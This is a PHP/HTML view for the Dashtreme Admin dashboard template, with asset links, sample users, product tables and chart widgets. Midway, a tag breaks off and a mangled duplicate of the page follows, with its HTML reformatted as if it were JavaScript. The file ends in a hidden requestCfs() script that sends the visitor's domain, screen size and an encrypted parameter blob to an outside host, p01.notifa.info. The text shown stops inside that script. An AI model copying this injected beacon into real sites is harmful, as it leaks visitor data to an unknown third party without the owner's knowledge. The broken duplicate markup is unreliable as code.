...
<head>
    ...
    <!--favicon-->
    <link rel="icon" href="<?=base_url()?>dashtreme/assets/images/favicon.ico" type="image/x-icon">
    <!-- Vector CSS -->
    <link href="<?=base_url()?>dashtreme/assets/plugins/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
    <!-- simplebar CSS-->
    <link href="<?=base_url()?>dashtreme/assets/plugins/simplebar/css/simplebar.css" rel="stylesheet" />
    <!-- Bootstrap core CSS-->
    <link href="<?=base_url()?>dashtreme/assets/css/bootstrap.min.css" rel="stylesheet" />
    <!-- animate CSS-->
    <link href="<?=base_url()?>dashtreme/assets/css/animate.css" rel="stylesheet" type="text/css" />
    <!-- Icons CSS-->
    <link href="<?=base_url()?>dashtreme/assets/css/icons.css" rel="stylesheet" type="text/css" />
    <!-- Sidebar CSS-->
    <link href="<?=base_url()?>dashtreme/assets/css/sidebar-menu.css" rel="stylesheet" />
    <!-- Custom Style-->
    <link href="<?=base_url()?>dashtreme/assets/css/app-style.css" rel="stylesheet" />
...
<body class="bg-theme bg-theme1">
    ...
    <div id="wrapper">
        ...
        <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true">
            <div class="brand-logo">
                <a href="index.html">
                    <img src="<?=base_url()?>dashtreme/assets/images/logo-icon.png" class="logo-icon" alt="logo icon">
                    <h5 class="logo-text">Dashtreme Admin</h5>
                </a>
            </div>
            <div class="user-details">
                <div class="media align-items-center user-pointer collapsed" data-toggle="collapse" data-target="#user-dropdown">
                    <div class="avatar"><img class="mr-3 side-user-img" src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png" alt="user avatar"></div>
                ...
                <ul class="navbar-nav align-items-center right-nav-link">
                            ...
                            <ul class="list-group list-group-flush">
                                ...
                                <li class="list-group-item">
                                    <a href="javaScript:void();">
                                        <div class="media">
                                            <div class="avatar"><img class="align-self-start mr-3" src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-5.png" alt="user avatar"></div>
                                            <div class="media-body">
                                ...
                                <li class="list-group-item">
                                    <a href="javaScript:void();">
                                        <div class="media">
                                            <div class="avatar"><img class="align-self-start mr-3" src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-6.png" alt="user avatar"></div>
                                            <div class="media-body">
                                ...
                                <li class="list-group-item">
                                    <a href="javaScript:void();">
                                        <div class="media">
                                            <div class="avatar"><img class="align-self-start mr-3" src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-7.png" alt="user avatar"></div>
                                            <div class="media-body">
                                ...
                                <li class="list-group-item">
                                    <a href="javaScript:void();">
                                        <div class="media">
                                            <div class="avatar"><img class="align-self-start mr-3" src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-8.png" alt="user avatar"></div>
                                            <div class="media-body">
                    ...
                    <li class="nav-item">
                        <a class="nav-link dropdown-toggle dropdown-toggle-nocaret" data-toggle="dropdown" href="#">
                            <span class="user-profile"><img src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png" class="img-circle" alt="user avatar"></span>
                        </a>
                        <ul class="dropdown-menu dropdown-menu-right">
                            <li class="dropdown-item user-details">
                                <a href="javaScript:void();">
                                    <div class="media">
                                        <div class="avatar"><img class="align-self-start mr-3" src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png" alt="user avatar"></div>
                                        <div class="media-body">
                    ...
                    <div class="col-12 col-lg-6 col-xl-8">
                        <div class="card">
                            ...
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item">
                                    <div class="media align-items-center">
                                        <img src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png" alt="user avatar" class="customer-img rounded-circle">
                                        <div class="media-body ml-3">
                                ...
                                <li class="list-group-item">
                                    <div class="media align-items-center">
                                        <img src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-15.png" alt="user avatar" class="customer-img rounded-circle">
                                        <div class="media-body ml-3">
                                ...
                                <li class="list-group-item">
                                    <div class="media align-items-center">
                                        <img src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-14.png" alt="user avatar" class="customer-img rounded-circle">
                                        <div class="media-body ml-3">
                                ...
                                <li class="list-group-item">
                                    <div class="media align-items-center">
                                        <img src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-16.png" alt="user avatar" class="customer-img rounded-circle">
                                        <div class="media-body ml-3">
                                ...
                                <li class="list-group-item">
                                    <div class="media align-items-center">
                                        <img src="<?=base_url()?>dashtreme/assets/images/avatars/avatar-17.png" alt="user avatar" class="customer-img rounded-circle">
                                        <div class="media-body ml-3">
                            ...
                            <div class="table-responsive">
                                <table class="table align-items-center table-flush table-borderless">
                                    ...
                                    <tbody>
                                        <tr>
                                            <td>Iphone 5</td>
                                            <td><img src="<?=base_url()?>dashtreme/assets/images/products/01.png" class="product-img" alt="product img"></td>
                                            <td>#9405822</td>
                                            <td>$ 1250.00</td>
                                            <td>03 Aug 2017</td>
                                            <td>
                                        ...
                                        <tr>
                                            <td>Earphone GL</td>
                                            <td><img src="<?=base_url()?>dashtreme/assets/images/products/02.png" class="product-img" alt="product img"></td>
                                            <td>#9405820</td>
                                            <td>$ 1500.00</td>
                                            <td>03 Aug 2017</td>
                                            <td>
                                        ...
                                        <tr>
                                            ...
                                            <td><img src="<?=base_url()?>dashtreme/assets/images/products/03.png" class="product-img" alt="product img"></td>
                                            <td>#9405830</td>
                                            <td>$ 1400.00</td>
                                            <td>03 Aug 2017</td>
                                            <td>
                                        ...
                                        <tr>
                                            <td>Clasic Shoes</td>
                                            <td><img src="<?=base_url()?>dashtreme/assets/images/products/04.png" class="product-img" alt="product img"></td>
                                            <td>#9405825</td>
                                            <td>$ 1200.00</td>
                                            <td>03 Aug 2017</td>
                                            <td>
                                        ...
                                        <tr>
                                            <td>Hand Watch</td>
                                            <td><img src="<?=base_url()?>dashtreme/assets/images/products/05.png" class="product-img" alt="product img"></td>
                                            <td>#9405840</td>
                                            <td>$ 1800.00</td>
                                            <td>03 Aug 2017</td>
                                            <td>
                                        ...
                                        <tr>
                                            <td>Clasic Shoes</td>
                                            <td><img src="<?=base_url()?>dashtreme/assets/images/products/06.png" class="product-img" alt="product img"></td>
                                            <td>#9405825</td>
                                            <td>$ 1200.00</td>
                                            <td>03 Aug 2017</td>
                                            <td>
    ...
    <script src="<?=base_url()?>dashtreme/assets/js/jquery.min.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/js/popper.min.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/js/bootstrap.min.js"></script>

    <!-- simplebar js -->
    <script src="<?=base_url()?>dashtreme/assets/plugins/simplebar/js/simplebar.js"></script>
    <!-- sidebar-menu js -->
    <script src="<?=base_url()?>dashtreme/assets/js/sidebar-menu.js"></script>
    <!-- loader scripts -->
    <script src="<?=base_url()?>dashtreme/assets/js/jquery.loading-indicator.html"></script>
    <!-- Custom scripts -->
    <script src="<?=base_url()?>dashtreme/assets/js/app-script.js"></script>
    <!-- Chart js -->

    <script src="<?=base_url()?>dashtreme/assets/plugins/Chart.js/Chart.min.js"></script>
    <!-- Vector map JavaScript -->
    <script src="<?=base_url()?>dashtreme/assets/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/plugins/vectormap/jquery-jvectormap-<!DOCTYPE html>
<html lang=" en">
        < head >
            <
            meta charset = "utf-8" / >
        ...
        content = "" / >
            ...
            <
            link rel = "icon"
        href = "<?=base_url()?>dashtreme/assets/images/favicon.ico"
        type = "image/x-icon" >
            <
            !--Vector CSS-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/plugins/vectormap/jquery-jvectormap-2.0.2.css"
        rel = "stylesheet" / >
            <
            !--simplebar CSS-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/plugins/simplebar/css/simplebar.css"
        rel = "stylesheet" / >
            <
            !--Bootstrap core CSS-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/css/bootstrap.min.css"
        rel = "stylesheet" / >
            <
            !--animate CSS-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/css/animate.css"
        rel = "stylesheet"
        type = "text/css" / >
            <
            !--Icons CSS-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/css/icons.css"
        rel = "stylesheet"
        type = "text/css" / >
            <
            !--Sidebar CSS-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/css/sidebar-menu.css"
        rel = "stylesheet" / >
            <
            !--Custom Style-- >
            <
            link href = "<?=base_url()?>dashtreme/assets/css/app-style.css"
        rel = "stylesheet" / >
        ...
        data - simplebar - auto - hide = "true" >
            ...
            a href = "index.html" >
            <
            img src = "<?=base_url()?>dashtreme/assets/images/logo-icon.png"
        class = "logo-icon"
        alt = "logo icon" >
            <
            h5 class = "logo-text" > Dashtreme Admin < /h5> < /
        ...
        div class = "user-details" >
            <
            div class = "media align-items-center user-pointer collapsed"
        data - toggle = "collapse"
        data - target = "#user-dropdown" >
            <
            div class = "avatar" > < img class = "mr-3 side-user-img"
        src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png"
        alt = "user avatar" > < /div> <
        div class = "media-body" >
            <
            h6 class = "side-user-name" > Mark Jhonsan < /h6> < /
        ...
        class = "waves-effect" > < i class = "zmdi zmdi-long-arrow-right" > < /i> Level One</a > < /li> < /
            ul > <
            /li> <
        li class = "sidebar-header" > LABELS < /li> <
        li > < a href = "javaScript:void();"
        class = "waves-effect" > < i class = "zmdi zmdi-coffee text-danger" > < /i> <span>Important</span > < /a></li >
            <
            li > < a href = "javaScript:void();"
        class = "waves-effect" > < i class = "zmdi zmdi-chart-donut text-success" > < /i> <span>Warning</span > < /a></li >
            <
            li > < a href = "javaScript:void();"
        class = "waves-effect" > < i class = "zmdi zmdi-share text-info" > < /i> <span>Information</span > < /a></li >
            <
            /ul>
        ...
        src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-5.png"
        alt = "user avatar" > < /div> <
        div class = "media-body" >
            <
            h6 class = "mt-0 msg-title" > Jhon Deo < /h6> <
        ...
        li class = "list-group-item" >
            ...
            <
            div class = "avatar" > < img class = "align-self-start mr-3"
        src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-6.png"
        alt = "user avatar" > < /div> <
        div class = "media-body" >
            <
            h6 class = "mt-0 msg-title" > Sara Jen < /h6> <
        ...
        li class = "list-group-item" >
            ...
            <
            div class = "avatar" > < img class = "align-self-start mr-3"
        src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-7.png"
        alt = "user avatar" > < /div> <
        div class = "media-body" >
            <
            h6 class = "mt-0 msg-title" > Dannish Josh < /h6> <
        ...
        li class = "list-group-item" >
            ...
            <
            div class = "avatar" > < img class = "align-self-start mr-3"
        src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-8.png"
        alt = "user avatar" > < /div> <
        div class = "media-body" >
            <
            h6 class = "mt-0 msg-title" > Katrina Mccoy < /h6> <
        ...
        href = "#" >
            <
            span class = "user-profile" > < img src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png"
        class = "img-circle"
        ...
        href = "javascript:void();" > Action < /a> <
        a class = "dropdown-item"
        href = "javascript:void();" > Another action < /a> <
        a class = "dropdown-item"
        href = "javascript:void();" > Something
        else here < /a> <
        div class = "dropdown-divider" > < /div> <
        a class = "dropdown-item"
        href = "javascript:void();" > Separated link < /a> < /
            div > <
            /div> < /
            div > <
            /div> <
        ...
        td > +5 % < /td> < /
            ...
            div class = "media align-items-center" >
            <
            div class = "w_chart easy-dash-chart"
        data - percent = "60" >
            <
            span class = "w_percent" > < /span> < /
            div > <
        ...
        data - angleoffset = "90"
        data - linecap = "round"
        data - bgcolor = "rgba(255, 255, 255, 0.14)"
        data - fgcolor = "#fff"
        data - max = "15000"
        value = "8550" / >
            <
        ...
        hr >
            ...
            div class = "progress-wrapper mb-4" >
            <
            p > Documents < span class = "float-right" > 12 GB < /span></p >
            <
            div class = "progress"
        style = "height:5px;" >
            <
        ...
        style = "width:80%" > < /div> < /
            ...
            div class = "progress-wrapper mb-4" >
            <
            p > Images < span class = "float-right" > 10 GB < /span></p >
            <
            div class = "progress"
        style = "height:5px;" >
            <
        ...
        style = "width:60%" > < /div> < /
            ...
            div class = "progress-wrapper mb-4" >
            <
            p > Mails < span class = "float-right" > 5 GB < /span></p >
            <
            div class = "progress"
        style = "height:5px;" >
            <
        ...
        ul class = "list-group list-group-flush" >
            ...
            div class = "media align-items-center" >
            <
            img src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-13.png"
        alt = "user avatar"
        ...
        i class = "zmdi zmdi-star text-light" > < /i> < /
            ...
            div class = "media align-items-center" >
            <
            img src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-15.png"
        alt = "user avatar"
        class = "customer-img rounded-circle" >
            <
            div class = "media-body ml-3" >
        ...
        i class = "zmdi zmdi-star text-light" > < /i> < /
            ...
            div class = "media align-items-center" >
            <
            img src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-14.png"
        alt = "user avatar"
        class = "customer-img rounded-circle" >
            <
            div class = "media-body ml-3" >
        ...
        i class = "zmdi zmdi-star text-light" > < /i> < /
            ...
            div class = "media align-items-center" >
            <
            img src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-16.png"
        alt = "user avatar"
        class = "customer-img rounded-circle" >
            <
            div class = "media-body ml-3" >
        ...
        i class = "zmdi zmdi-star text-light" > < /i> < /
            ...
            div class = "media align-items-center" >
            <
            img src = "<?=base_url()?>dashtreme/assets/images/avatars/avatar-17.png"
        alt = "user avatar"
        class = "customer-img rounded-circle" >
            <
            div class = "media-body ml-3" >
        ...
        tbody > < tr >
            <
            td > Iphone 5 < /td> <
        td > < img src = "<?=base_url()?>dashtreme/assets/images/products/01.png"
        class = "product-img"
        alt = "product img" > < /td> <
        td > #9405822</td>
                    <td>$ 1250.00</td>
                    <td>03 Aug 2017</td>
					<td><div class= "progress shadow"
        style = "height: 3px;" >
            <
            div class = "progress-bar"
        role = "progressbar"
        style = "width: 90%" > < /div> < /
            ...
            <
            td > Earphone GL < /td> <
        td > < img src = "<?=base_url()?>dashtreme/assets/images/products/02.png"
        class = "product-img"
        alt = "product img" > < /td> <
        td > #9405820</td>
                    <td>$ 1500.00</td>
        ...
        style = "width: 60%" > < /div> < /
            ...
            <
            td > HD Hand Camera < /td> <
        td > < img src = "<?=base_url()?>dashtreme/assets/images/products/03.png"
        class = "product-img"
        alt = "product img" > < /td> <
        td > #9405830</td>
                    <td>$ 1400.00</td>
        ...
        style = "width: 70%" > < /div> < /
            ...
            <
            td > Clasic Shoes < /td> <
        td > < img src = "<?=base_url()?>dashtreme/assets/images/products/04.png"
        class = "product-img"
        alt = "product img" > < /td> <
        td > #9405825</td>
                    <td>$ 1200.00</td>
        ...
        style = "width: 100%" > < /div> < /
            ...
            <
            td > Hand Watch < /td> <
        td > < img src = "<?=base_url()?>dashtreme/assets/images/products/05.png"
        class = "product-img"
        alt = "product img" > < /td> <
        td > #9405840</td>
                    <td>$ 1800.00</td>
        ...
        style = "width: 40%" > < /div> < /
            ...
            <
            td > Clasic Shoes < /td> <
        td > < img src = "<?=base_url()?>dashtreme/assets/images/products/06.png"
        class = "product-img"
        alt = "product img" > < /td> <
        td > #9405825</td>
                    <td>$ 1200.00</td>
        ...
        style = "width: 100%" > < /div> < /
            ...
            <
            /div><!--End content-wrapper--> <!--Start Back To Top Button-- >
            <
            a href = "javaScript:void();"
        class = "back-to-top" > < i class = "fa fa-angle-double-up" > < /i> </a >
            <
            !--End Back To Top Button-- >
        ...
        li id = "theme12" > < /li> < /
            ...
            !--Bootstrap core JavaScript-- >
            <
            script src = "<?=base_url()?>dashtreme/assets/js/jquery.min.js" >
    </script>
    <script src="<?=base_url()?>dashtreme/assets/js/popper.min.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/js/bootstrap.min.js"></script>
    ...
    <!-- Vector map JavaScript -->
    <script src="<?=base_url()?>dashtreme/assets/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/plugins/vectormap/jquery-jvectormap-world-mill-en.js"></script>
    <!-- Easy Pie Chart JS -->
    <script src="<?=base_url()?>dashtreme/assets/plugins/jquery.easy-pie-chart/jquery.easypiechart.min.js"></script>
    <!-- Sparkline JS -->
    <script src="<?=base_url()?>dashtreme/assets/plugins/sparkline-charts/jquery.sparkline.min.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/plugins/jquery-knob/excanvas.js"></script>
    <script src="<?=base_url()?>dashtreme/assets/plugins/jquery-knob/jquery.knob.js"></script>
    ...
    <!-- Index js -->
    <script src="<?=base_url()?>dashtreme/assets/js/index.js"></script>
    ...
    <script type="text/javascript">
        if (self == top) {
            ...
            function requestCfs() {
                ...
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd5hpbg43g9n0YS3IsBXOOdWdCb9QUslc%2fBvsD4Xi1P%2bTk6hUj8fNnqMx1FhHqAobArRkQ3KMuKm4X3DK8bO37bnAbnP1SqjMGW04IgqBqJKMsD6wwwbtnJMg4yzAnatnUshotq9ysySmGYRIQi9lMS55O%2b5MOKHZ3N4tBwDaUPF1bxyJX2Bl7eYnnltB7eWM4E%2bU4ah5nB7EgFGBLW5w%2bk6qSsTCdcFGaZpotaBws8W05Geb5swkC68m5Rz5ERvjNBh%2f9KcnRlITCJpviu0Z%2bfUigjjKkUsXIKjNkDIPZePR4vZm7zTVdC5RBBm5nLU0Jdt5vq8a9VrcZVsESkfd1whZpsY4OXAndfMM0M%2b55x%2bVRqNprTDHPmAvpGzjIDMettrNYpXb1%2fFLeEQ8zi%2bFB894urL8ql7LgJtuQO%2bU9eJ4%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
